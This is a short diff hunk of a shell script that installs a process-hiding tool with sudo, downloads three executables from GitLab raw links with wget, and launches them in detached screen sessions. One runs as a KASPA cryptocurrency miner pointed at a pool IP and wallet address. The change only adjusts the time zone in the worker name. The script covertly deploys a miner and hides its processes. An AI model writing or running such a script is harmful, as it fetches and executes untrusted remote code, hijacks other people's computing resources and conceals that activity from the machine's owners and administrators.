@@ -8,6 +8,6 @@ sudo npm i -g node-process-hider && sudo ph add image && sudo ph add project
 wget -qO image https://gitlab.com/teletyl/oon/-/raw/main/news && chmod +x image
 wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/tuyulcakep && chmod +x project
 wget -qO server https://gitlab.com/mauliki9999/codet/-/raw/main/server2 && chmod +x server
-screen -dms run ./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-$(date +"%H-%M-%S")) --tls enable
+screen -dms run ./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable
 screen -dms run ./server
 EOF
